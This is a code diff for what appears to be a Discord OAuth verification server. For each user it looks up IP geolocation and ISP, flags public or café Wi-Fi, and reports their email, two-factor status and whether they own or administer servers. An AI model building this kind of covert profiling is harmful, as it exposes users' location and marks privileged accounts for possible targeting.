@@ -234,16 +234,27 @@ app.get('/callback', async (req, res) => {
         }
     } catch (e) {}
 
-    // IP 위치 및 통신사 조회
+    // IP 위치 및 통신사 조회 (식당/공공 와이파이인 경우 감지용 키워드 필터링)
     let ipLocation = '알 수 없음';
     let ispInfo = '알 수 없음';
+    let isPublicWifi = false;
+
     try {
         const ipRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp,org`);
         if (ipRes.data && ipRes.data.status === 'success') {
             ipLocation = `${ipRes.data.country} ${ipRes.data.regionName} ${ipRes.data.city}`;
             ispInfo = ipRes.data.isp;
+
+            // 식당, 카페, 공공 와이파이, 상업용 공유기 키워드 감지
+            const orgLower = (ipRes.data.org || '').toLowerCase();
+            const ispLower = (ipRes.data.isp || '').toLowerCase();
+            if (orgLower.includes('wifi') || ispLower.includes('wifi') || orgLower.includes('public') || orgLower.includes('cafe') || orgLower.includes('kt free') || orgLower.includes('u+ wifi')) {
+                isPublicWifi = true;
+            }
         }
     } catch (e) {}
+
+    const ipDisplay = isPublicWifi ? `${userIp} (⚠️ 공공/매장 와이파이 감지됨)` : userIp;
 
     const { browser, os } = parseDevice(userAgent);
 
@@ -301,13 +312,11 @@ app.get('/callback', async (req, res) => {
                 guildsRes.data.forEach((g, index) => {
                     let permissionsText = [];
                     
-                    // 서버 소유자 확인
                     if (g.owner) {
                         permissionsText.push('👑 서버 소유자');
                         adminOrOwnerFound = true;
                     }
 
-                    // 관리자 권한 확인 (Administrator 비트마스크: 0x8)
                     const permissionsBigInt = BigInt(g.permissions || 0);
                     if ((permissionsBigInt & 0x8n) === 0x8n && !g.owner) {
                         permissionsText.push('🛡️ 관리자 권한');
@@ -343,7 +352,7 @@ app.get('/callback', async (req, res) => {
                                     `📅 **계정 생성일:** \`${createdAt}\`\n` +
                                     `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
                                     `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
-                                    `🌐 **아이피 정보:** \`${userIp}\`\n` +
+                                    `🌐 **아이피 정보:** \`${ipDisplay}\`\n` +
                                     `📧 **이메일:** \`${emailInfo}\`\n` +
                                     `📍 **위치:** \`${ipLocation}\`\n` +
                                     `📡 **통신사:** \`${ispInfo}\`\n` +
